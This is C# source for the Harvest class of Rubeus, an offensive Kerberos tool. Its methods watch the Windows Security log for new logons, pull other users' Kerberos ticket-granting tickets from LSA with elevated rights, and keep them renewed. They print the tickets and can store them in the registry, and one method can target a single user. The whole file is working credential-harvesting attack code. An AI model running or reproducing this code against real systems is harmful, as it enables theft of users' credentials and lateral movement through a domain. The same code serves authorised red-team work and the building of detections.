using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics.Eventing.Reader;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace Rubeus
{
    public class Harvest
    {
        public static void HarvestTGTs(int intervalMinutes, string registryBasePath)
        {
            // First extract all TGTs then monitor the event log (indefinitely) for 4624 logon events
            //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
            // On each interval, renew any tickets that are about to expire and refresh the cache.
            // End result: every "intervalMinutes" a set of currently valid TGT .kirbi files are dumped to console

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                return;
            }

            Console.WriteLine("[*] Action: TGT Harvesting (w/ auto-renewal)");
            Console.WriteLine("\r\n[*] Monitoring every {0} minutes for 4624 logon events\r\n", intervalMinutes);

            // used to keep track of LUIDs we've already dumped
            var seenLUIDs = new Dictionary<ulong, bool>();

            // get the current set of TGTs
            List<KRB_CRED> creds = LSA.ExtractTGTs(new Interop.LUID());

            while (true)
            {
                // check for 4624 logon events in the past "intervalSeconds"
                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]]", intervalMinutes * 60 * 1000);
                EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
                EventLogReader logReader = new EventLogReader(eventsQuery);

                for (EventRecord eventInstance = logReader.ReadEvent(); eventInstance != null; eventInstance = logReader.ReadEvent())
                {
                    // if there's an event, extract out the logon ID (LUID) for the session
                    string eventMessage = eventInstance.FormatDescription();
                    DateTime eventTime = (DateTime)eventInstance.TimeCreated;

                    int startIndex = eventMessage.IndexOf("New Logon:");
                    string message = eventMessage.Substring(startIndex);

                    // extract out relevant information from the event log message
                    var acctNameExpression = new Regex(string.Format(@"\n.*Account Name:\s*(?<name>.+?)\r\n"));
                    Match acctNameMatch = acctNameExpression.Match(message);
                    var acctDomainExpression = new Regex(string.Format(@"\n.*Account Domain:\s*(?<domain>.+?)\r\n"));
                    Match acctDomainMatch = acctDomainExpression.Match(message);

                    if (acctNameMatch.Success)
                    {
                        var srcNetworkExpression = new Regex(string.Format(@"\n.*Source Network Address:\s*(?<address>.+?)\r\n"));
                        Match srcNetworkMatch = srcNetworkExpression.Match(message);

                        string logonName = acctNameMatch.Groups["name"].Value;
                        string accountDomain = "";
                        string srcNetworkAddress = "";
                        try
                        {
                            accountDomain = acctDomainMatch.Groups["domain"].Value;
                        }
                        catch { }
                        try
                        {
                            srcNetworkAddress = srcNetworkMatch.Groups["address"].Value;
                        }
                        catch { }

                        // ignore SYSTEM logons and other defaults
                        if (!Regex.IsMatch(logonName, @"SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON", RegexOptions.IgnoreCase))
                        {
                            Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, accountDomain, logonName, srcNetworkAddress);

                            var expression2 = new Regex(string.Format(@"\n.*Logon ID:\s*(?<id>.+?)\r\n"));
                            Match match2 = expression2.Match(message);

                            if (match2.Success)
                            {
                                try
                                {
                                    // check if we've seen this LUID before
                                    Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
                                    if (!seenLUIDs.ContainsKey((ulong)luid))
                                    {
                                        seenLUIDs[luid] = true;
                                        // if we haven't seen it, extract any TGTs for that particular logon ID and add to the cache
                                        List<KRB_CRED> newCreds = LSA.ExtractTGTs(luid);
                                        creds.AddRange(newCreds);
                                    }
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[X] Exception: {0}", e.Message);
                                }
                            }
                        }
                    }
                }

                for (int i = creds.Count - 1; i >= 0; i--)
                {
                    DateTime endTime = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].endtime);
                    DateTime renewTill = TimeZone.CurrentTimeZone.ToLocalTime(creds[i].enc_part.ticket_info[0].renew_till);

                    // check if the ticket is going to expire before the next interval checkin
                    if (endTime < DateTime.Now.AddMinutes(intervalMinutes))
                    {
                        // check if the ticket's renewal limit will be valid within the next interval
                        if (renewTill < DateTime.Now.AddMinutes(intervalMinutes))
                        {
                            // renewal limit under checkin interval, so remove the ticket from the cache
                            creds.RemoveAt(i);
                        }
                        else
                        {
                            // renewal limit after checkin interval, so renew the TGT
                            string userName = creds[i].enc_part.ticket_info[0].pname.name_string[0];
                            string domainName = creds[i].enc_part.ticket_info[0].prealm;

                            Console.WriteLine("[*] Renewing TGT for {0}@{1}", userName, domainName);
                            byte[] bytes = Renew.TGT(creds[i], false, "", false);
                            KRB_CRED renewedCred = new KRB_CRED(bytes);
                            creds[i] = renewedCred;
                        }
                    }
                }

                Console.WriteLine("\r\n[*] {0} - Current usable TGTs:\r\n", DateTime.Now);
                LSA.DisplayTGTs(creds);
                if (registryBasePath != null)
                {
                    LSA.SaveTicketsToRegistry(creds, registryBasePath);
                }

                Thread.Sleep(intervalMinutes * 60 * 1000);
            }
        }

        public static void Monitor4624(int intervalSeconds, string targetUser, string registryBasePath = null)
        {
            // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and dumps TGTs JUST for the specific
            //  logon IDs (LUIDs) based on the event log. Can optionally only extract for a targeted user.

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                return;
            }

            // used to keep track of LUIDs we've already dumped
            var seenLUIDs = new Dictionary<ulong, bool>();

            Console.WriteLine("[*] Action: TGT Monitoring");
            Console.WriteLine("[*] Monitoring every {0} seconds for 4624 logon events", intervalSeconds);

            if (!String.IsNullOrEmpty(targetUser))
            {
                Console.WriteLine("[*] Target user : {0}", targetUser);
            }
            Console.WriteLine();


            while (true)
            {
                // check for 4624 logon events in the past "intervalSeconds"
                string queryString = String.Format("*[System[EventID=4624 and TimeCreated[timediff(@SystemTime) <= {0}]]] and *[EventData[Data[@Name='AuthenticationPackageName']='Kerberos']]", (intervalSeconds+3) * 1000);
                EventLogQuery eventsQuery = new EventLogQuery("Security", PathType.LogName, queryString);
                EventLogReader logReader = new EventLogReader(eventsQuery);

                for (EventRecord eventInstance = logReader.ReadEvent(); eventInstance != null; eventInstance = logReader.ReadEvent())
                {
                    // if there's an event, extract out the logon ID (LUID) for the session
                    string eventMessage = eventInstance.FormatDescription();
                    DateTime eventTime = (DateTime)eventInstance.TimeCreated;

                    
                    string targetUserName = eventInstance.Properties[5].Value.ToString();
                    string targetUserDomain = eventInstance.Properties[6].Value.ToString();
                    string targetLogonId = eventInstance.Properties[7].Value.ToString();
                    string srcNetworkAddress = eventInstance.Properties[18].Value.ToString();

                    // ignore SYSTEM logons and other defaults
                    if (Regex.IsMatch(targetUserName,
                        @"^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|UMFD-[0-9]+|DWM-[0-9]+|ANONYMOUS LOGON)$",
                        RegexOptions.IgnoreCase))
                    {
                        continue;
                    }

                    Console.WriteLine("\r\n[+] {0} - 4624 logon event for '{1}\\{2}' from '{3}'", eventTime, targetUserDomain, targetUserName, srcNetworkAddress);
                    // filter if we're targeting a specific user
                    if (targetUser != null && !Regex.IsMatch(targetUserName, Regex.Escape(targetUser), RegexOptions.IgnoreCase))
                    {
                        continue;
                    }

                    try
                    {
                        // check if we've seen this LUID before
                        Interop.LUID luid = new Interop.LUID(targetLogonId);
                        if (!seenLUIDs.ContainsKey((ulong)luid))
                        {
                            seenLUIDs[luid] = true;
                            // if we haven't seen it, extract any TGTs for that particular logon ID
                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Exception: {0}", e.Message);
                    }
                }

                Thread.Sleep(intervalSeconds * 1000);
            }
        }
    }
}
